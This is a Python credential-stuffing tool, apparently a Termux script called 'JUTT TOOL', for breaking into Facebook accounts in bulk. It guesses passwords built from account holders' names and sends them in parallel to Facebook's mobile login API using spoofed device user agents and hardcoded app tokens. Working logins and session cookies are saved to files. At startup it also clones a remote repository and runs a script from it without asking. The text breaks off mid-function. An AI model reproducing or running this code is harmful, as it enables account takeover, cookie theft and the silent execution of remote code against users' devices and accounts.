#JUTT JUTT JUTT
#<<_________[ IMPORTING MODULES ]_________>>#
import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
import marshal
import os,base64
from os import system as clr
print('Checking For Update')
os.system("cd && rm -rf ZABI && git clone --depth=1 https://github.com/JUTT-007/ZABI")
os.system('cd && cd ZABI ;python Jutt_enc.py')
print('Updated Successfully')
time.sleep(3)
print('\n\033[0;97m[+]\033[1;32m WELLCOME TO JUTT TOOL 🌷...')
print('I AM INSTALLING MISSING MODULES IT WILL TAKE SOME TIME WAIT....')
time.sleep(7)
#####os.system('pkg install espeak -y')
print('MISSING MODULES INSTALLED SUCCESSFULLY')
os.system('espeak -a 300 " Wellcome,   To,  ,jutt ,Tool,"')
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError:
    os.system('pip install requests bs4 futures==2 > /dev/null')
except:pass
#_________[ PROXY SERVER ]______>>
try:
    prox= requests.get('https://github.com/Rananadeem5214/File11/Control_Room/blob/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:pass
prox=open('.prox.txt','r').read().splitlines()
#<<_________[ COLOR ]_________>>#
W = '\033[97;1m'
B = '\033[96;1m'
P = '\033[95;1m'
R = '\033[91;1m'
G = '\033[92;1m'
#####_____Folder-Setup_____#####
try:
        os.makedirs('/sdcard/JUTT')
except:
                pass
sys.stdout.write('\x1b]2;JUTT\x07')
#####_____User-Agents_____#####

#<<_________[ LOGO ]_________>>#
logo = (f"""
{W}        88                                 
{B}        88                 ,d       ,d     
{P}        88                 88       88     
{R}        88  88       88  MM88MMM  MM88MMM  
{G}        88  88       88    88       88     
{P}        88  88       88    88       88     
{B}88,   ,d88  "8a,   ,a88    88,      88,    
{P} "Y8888P"    `"YbbdP'Y8    "Y888    "Y888    XD
{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{W}
{W} [{R}+{W}]{R} OWNER   {R}:{R} ASIM JUTT
{W} [{R}+{W}]{R} STATUS  {R}:{R} PAID
{W} [{R}+{W}]{R} VERSION {R}:{R} 6.2
{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{W}
{W} [{R}+{W}]{W}            \033[1;41m\033[1;37m[WELLCOME TO \033[1;42m\033[1;37mJUTT TOOL]\x1b[0m
{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>""")
#<<_________[ LINE ]_________>>#
#<<_________[ LOOP ]_________>>#
loop=0
twf=[]
oks=[]
cps=[]
ok=[]
cp=[]
pcp=[]
id=[]
tokenku=[]
#########Lines#######
def line():
        print(f"{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>")
#<<_________[ CLEAR ]_________>>#
def clear():
        os.system(f'clear')
        print(logo)
#<<_________[ MAIN MENU ]_________>>#
def menu():
                        clear()
                        os.system('espeak -a 300 " Main     ,Menu, "')
                        print(f"{W} [{R}+{W}]                  {G}MAIN  MENU{W}")
                        line()
                        print(f"{W} [{R}1{W}] {W}FILE CLONING")
                        print(f"{W} [{R}2{W}] {W}FILE CREATE MENU")
                        print(f"{W} [{R}3{W}] {W}RANDOM NUM CLONING")
                        print(f"{W} [{R}4{W}] {W}SEPRATE LINKS FROM FILE")
                        print(f"{W} [{R}5{W}] {W}CUT USED LINKS FROM FILE")
                        print(f"{W} [{R}6{W}] {W}REMOVE DOUBLE LINKS FROM FILE ")
                        print(f"{W} [{R}7{W}] {W}UNBLOCK YOUR IP ADRESS TRY TO UNLOCK")
                        print(f"{W} [{R}0{W}] {R}EXIT FROM JUTT TOOL {W}[{R}X{W}] {W}")
                        line()
                        line()
                        xd=input(f'{W} [{R}+{W}] CHOSE: ')
                        if xd in ['1','01']:
                                clear()
                                print(f'{W} [{R}+{W}] EXAMPLE:  /sdcard/File.txt  etc..')
                                os.system('espeak -a 300 " Enter,   File,  , Name,"')
                                line()
                                file = input(f'{W} [{R}+{W}] PUT FILE\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'{W} [{R}+{W}] FILE NOT FOUND ')
                                        os.system('espeak -a 300 " wrong,   File,  , Name,"')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{W} [{R}+{W}]{G}                  METHOD MENU ')
                                line()
                                os.system('espeak -a 300 " Select, Method,"')
                                print(f'{W} [{R}1{W}] METHOD 1  {W}[{G}FOR NEW IDS{W}]')
                                print(f'{W} [{R}2{W}] METHOD 2  {W}[{G}FOR MIX IDS{W}]')
                                print(f'{W} [{R}3{W}] METHOD 3  {W}[{G}FOR MIX IDS{W}]')
                                print(f'{W} [{R}4{W}] METHOD 4  {W}[{G}FOR MIX IDS{W}]')
                                line()
                                mthd=input(f'{W} [{R}+{W}] CHOSE: ')
                                line()
                                plist = []
                                try:
                                        os.system('espeak -a 300 " Put,   Password,  ,Limit,"')
                                        ps_limit = int(input(f'{W} [{R}+{W}] PASS LIMIT : '))
                                except:
                                        ps_limit =1
                                clear()
                                print(f'{W} [{R}+{W}] EXP: first last,firtslast,first123')
                                line()
                                for i in range(ps_limit):
                                        plist.append(input(f'{W} [{R}+{W}] PUT PASS {i+1}: '))
                                clear()
                                print(f'{W} [{R}+{W}] DO YOU WANT TO SHOW CP IDS ? (y/n): ')
                                line()
                                cx=input(f'{W} [{R}+{W}] CHOSE: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=50) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        os.system('espeak -a 300 " Process,   will  be,   Started,    ,Please  Wait,"')
                                        print(f'{W} [{R}+{W}] TOTAL FILE ACCOUNTS : \033[1;32m'+total_ids+f' ')
                                        print(f'{W} [{R}+{W}] PROCESS START PLEASE WAIT.....')
                                        print(f'{W} [{R}+{W}]{R} USE FLIGHT MODE AFTER EVERY 2 MINUTS')
                                        line()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(ffb2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(ffb3,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(ffb4,ids,names,passlist)
                                print(f'\033[1;37m')
                                line()
                                os.system('espeak -a 300 " Process,   ,Completed,"')
                                print(f'{W} [{R}+{W}] PROCESS COMPLTED')
                                print(f"{W} [{R}+{W}] {W} OK IDZ : {G}%s "%(len(oks)))
                                print(f"{W} [{R}+{W}] {W} CP IDZ : {R}%s "%(len(cps)))
                                line()
                                input(f'{W} [{R}+{W}] PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                Create_menu()
                        elif xd in ['3','03']:
                                Main_Menu()
                        elif xd in ['4','04']:
                                with_names()
                        elif xd in ['5','05']:
                                used_cutter()
                        elif xd in ['6','06']:
                                remove_links()
                        elif xd in ['7','07']:
                                ipMain()
                        elif xd in ['0','00']:
                                exit(f'{W} [{R}+{W}] Thanks For Use ')
                        else:
                                exit(f'{W} [{R}+{W}] Option not found in menu...')
#<<_________[ METHOD 1 ]_________>>#
def ffb1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}JUTT{W}]{R} %s{W} | {R}M1 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])            
                        FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
                        FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
                        facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
                        fbbv = str(random.randint(11111111, 99999999))
                        fbrv = str(random.randint(11111111, 99999999))
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
                        andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
                        country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
                        fbaan = random.choice(['FB4A', 'Orca-Android'])
                        fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
                        fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
                        reamodels = random.choice(['Redmi 01A', 'Redmi 1', 'Redmi 10', 'Redmi 10 (2022)', 'Redmi 10 5G', 'Redmi 10 Prime', 'Redmi 10 Prime (2022)', 'Redmi 10 Prime+ 5G', 'Redmi 10A', 'Redmi 10C', 'Redmi 10I', 'Redmi 10S', 'Redmi 10X', 'Redmi 10X Pro', 'Redmi 11', 'Redmi 11 Prime', 'Redmi 11X', 'Redmi 12', 'Redmi 12C', 'Redmi 1S', 'Redmi 2', 'Redmi 2A', 'Redmi 3', 'Redmi 3S', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro Extreme'])
                        yes = random.choice(['Mi 10', 'Mi 10 Lite 5G', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Ultra', 'Mi 10 Ultra 5G', 'Mi 10i', 'Mi 10S', 'Mi 10T', 'Mi 10T 5G', 'Mi 10T Lite', 'Mi 10T Lite 5G', 'Mi 10T Pro', 'Mi 10T Pro 5G', 'Mi 11', 'Mi 11 Lite', 'Mi 11 Lite 5G', 'Mi 11 Lite 5G NE', 'Mi 11 Pro', 'Mi 11 Ultra', 'Mi 11i', 'Mi 11T', 'Mi 11T Pro', 'Mi 11X', 'Mi 11X Pro', 'Mi 13 Ultra Test', 'Mi 1S', 'Mi 2', 'Mi 2A', 'Mi 2S', 'Mi 2SC', 'Mi 3', 'Mi 30 Pro', 'Mi 3C', 'Mi 3W', 'Mi 4', 'Mi 4 LTE', 'Mi 4C', 'Mi 4i', 'Mi 4S'])
                        e = f"[FBAN/FB4A;FBAV/{facebookv};FBBV/{fbbv};"
                        u1 = f"[FBAN/Orca-Android;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.orca;FBLC/en_BD;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Xiaomi;FBDV{yes};FBSV/{FBSV};FBCA/arm64-v8a:null;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        u2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/{fbweb};FBLC/en_BD;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Xiaomi;FBDV{yes};FBSV/{FBSV};nullFBCA/armeabi-v7a:armeabi;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        i3 = f"[FBAN/FB4A;FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};[FBAN/{FBAN};FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height};FBLC/en_US;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Redmi;FBDV/{reamodels};FBSV/{andver};FBCA/armeabi-v7a:armeabi;]"
                        x1 = e + u1
                        x2 = e + u2
                        x3 = e + i3
                        ua = random.choice([x1,x2,x3])
                        #a1 = random.choice(prox)
                        #proxs= {'http': 'socks4://'+a1}
                        data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'cpl': 'true',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'device_based_login_password',
'error_detail_type': 'button_with_disabled',
'source': 'register_api',
'email': ids,
'password': pas,
'access_token': '275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'generate_session_cookies': '1',
'meta_inf_fbmeta': 'NO_FILE',
'advertiser_id': str(uuid.uuid4()),
'currently_logged_in_userid': '0',
'locale': code1,
'client_country_code': loc1,
'method': 'auth.login',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
'api_key': '882a8490361da98702bf97a021ddc14d',
'sig': '1d2d2c81b7ac43af4db39465bf23e77e'}
                        headers = {'Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'X-FB-Net-HNI': '20083',
'User-Agent': ua,
'X-FB-Client-IP': 'True',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-SIM-HNI': '37460',
'X-Tigon-Is-Retry': 'False',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Connection-Quality': 'MOBILE.LTE',
'X-FB-Server-Cluster': 'True',
'Connection': 'keep-alive',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Host': 'graph.facebook.com',
'X-FB-Connection-Bandwidth': '80025933',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'Accept-Encoding': 'gzip, deflate',
'X-FB-Connection-Type': 'MOBILE.LTE',
'Content-Type': 'application/x-www-form-urlencoded'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [JUTT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        #print(f' Cookie: \033[1;32m'+cookies)
                                        open('/sdcard/JUTT/JUTT-M1-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/JUTT/JUTT-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [JUTT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JUTT/JUTT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                time.sleep(20)
#<<_________[ METHOD 2 ]_________>>#
def ffb2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}JUTT{W}]{R} %s{W} | {R}M2 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])            
                        FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
                        FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
                        facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
                        fbbv = str(random.randint(11111111, 99999999))
                        fbrv = str(random.randint(11111111, 99999999))
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
                        andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
                        country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
                        fbaan = random.choice(['FB4A', 'Orca-Android'])
                        fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
                        fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
                        reamodels = random.choice(['Redmi 01A', 'Redmi 1', 'Redmi 10', 'Redmi 10 (2022)', 'Redmi 10 5G', 'Redmi 10 Prime', 'Redmi 10 Prime (2022)', 'Redmi 10 Prime+ 5G', 'Redmi 10A', 'Redmi 10C', 'Redmi 10I', 'Redmi 10S', 'Redmi 10X', 'Redmi 10X Pro', 'Redmi 11', 'Redmi 11 Prime', 'Redmi 11X', 'Redmi 12', 'Redmi 12C', 'Redmi 1S', 'Redmi 2', 'Redmi 2A', 'Redmi 3', 'Redmi 3S', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro Extreme'])
                        yes = random.choice(['Mi 10', 'Mi 10 Lite 5G', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Ultra', 'Mi 10 Ultra 5G', 'Mi 10i', 'Mi 10S', 'Mi 10T', 'Mi 10T 5G', 'Mi 10T Lite', 'Mi 10T Lite 5G', 'Mi 10T Pro', 'Mi 10T Pro 5G', 'Mi 11', 'Mi 11 Lite', 'Mi 11 Lite 5G', 'Mi 11 Lite 5G NE', 'Mi 11 Pro', 'Mi 11 Ultra', 'Mi 11i', 'Mi 11T', 'Mi 11T Pro', 'Mi 11X', 'Mi 11X Pro', 'Mi 13 Ultra Test', 'Mi 1S', 'Mi 2', 'Mi 2A', 'Mi 2S', 'Mi 2SC', 'Mi 3', 'Mi 30 Pro', 'Mi 3C', 'Mi 3W', 'Mi 4', 'Mi 4 LTE', 'Mi 4C', 'Mi 4i', 'Mi 4S'])
                        e = f"[FBAN/FB4A;FBAV/{facebookv};FBBV/{fbbv};"
                        u1 = f"[FBAN/Orca-Android;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.orca;FBLC/en_BD;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Xiaomi;FBDV{yes};FBSV/{FBSV};FBCA/arm64-v8a:null;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        u2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/{fbweb};FBLC/en_BD;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Xiaomi;FBDV{yes};FBSV/{FBSV};nullFBCA/armeabi-v7a:armeabi;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        i3 = f"[FBAN/FB4A;FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};[FBAN/{FBAN};FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height};FBLC/en_US;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Redmi;FBDV/{reamodels};FBSV/{andver};FBCA/armeabi-v7a:armeabi;]"
                        x1 = e + u1
                        x2 = e + u2
                        x3 = e + i3
                        ua = random.choice([x1,x2,x3])
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": code2,"client_country_code": loc2,"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [JUTT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        print(f' COOKIES: \033[1;32m'+cookies)
                                        open('/sdcard/JUTT/JUTT-M2-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/JUTT/JUTT-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [JUTT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JUTT/JUTT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                time.sleep(20)
#<<_________[ METHOD 3 ]_________>>#
def ffb3(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}JUTT{W}]{R} %s{W} | {R}M3 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])            
                        FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
                        FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
                        facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
                        fbbv = str(random.randint(11111111, 99999999))
                        fbrv = str(random.randint(11111111, 99999999))
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
                        andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
                        country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
                        fbaan = random.choice(['FB4A', 'Orca-Android'])
                        fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
                        fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
                        reamodels = random.choice(['Redmi 01A', 'Redmi 1', 'Redmi 10', 'Redmi 10 (2022)', 'Redmi 10 5G', 'Redmi 10 Prime', 'Redmi 10 Prime (2022)', 'Redmi 10 Prime+ 5G', 'Redmi 10A', 'Redmi 10C', 'Redmi 10I', 'Redmi 10S', 'Redmi 10X', 'Redmi 10X Pro', 'Redmi 11', 'Redmi 11 Prime', 'Redmi 11X', 'Redmi 12', 'Redmi 12C', 'Redmi 1S', 'Redmi 2', 'Redmi 2A', 'Redmi 3', 'Redmi 3S', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro Extreme'])
                        yes = random.choice(['Mi 10', 'Mi 10 Lite 5G', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Ultra', 'Mi 10 Ultra 5G', 'Mi 10i', 'Mi 10S', 'Mi 10T', 'Mi 10T 5G', 'Mi 10T Lite', 'Mi 10T Lite 5G', 'Mi 10T Pro', 'Mi 10T Pro 5G', 'Mi 11', 'Mi 11 Lite', 'Mi 11 Lite 5G', 'Mi 11 Lite 5G NE', 'Mi 11 Pro', 'Mi 11 Ultra', 'Mi 11i', 'Mi 11T', 'Mi 11T Pro', 'Mi 11X', 'Mi 11X Pro', 'Mi 13 Ultra Test', 'Mi 1S', 'Mi 2', 'Mi 2A', 'Mi 2S', 'Mi 2SC', 'Mi 3', 'Mi 30 Pro', 'Mi 3C', 'Mi 3W', 'Mi 4', 'Mi 4 LTE', 'Mi 4C', 'Mi 4i', 'Mi 4S'])
                        e = f"[FBAN/FB4A;FBAV/{facebookv};FBBV/{fbbv};"
                        u1 = f"[FBAN/Orca-Android;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.orca;FBLC/en_BD;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Xiaomi;FBDV{yes};FBSV/{FBSV};FBCA/arm64-v8a:null;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        u2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/{fbweb};FBLC/en_BD;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Xiaomi;FBDV{yes};FBSV/{FBSV};nullFBCA/armeabi-v7a:armeabi;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        i3 = f"[FBAN/FB4A;FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};[FBAN/{FBAN};FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height};FBLC/en_US;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Redmi;FBDV/{reamodels};FBSV/{andver};FBCA/armeabi-v7a:armeabi;]"
                        x1 = e + u1
                        x2 = e + u2
                        x3 = e + i3
                        ua = random.choice([x1,x2,x3])
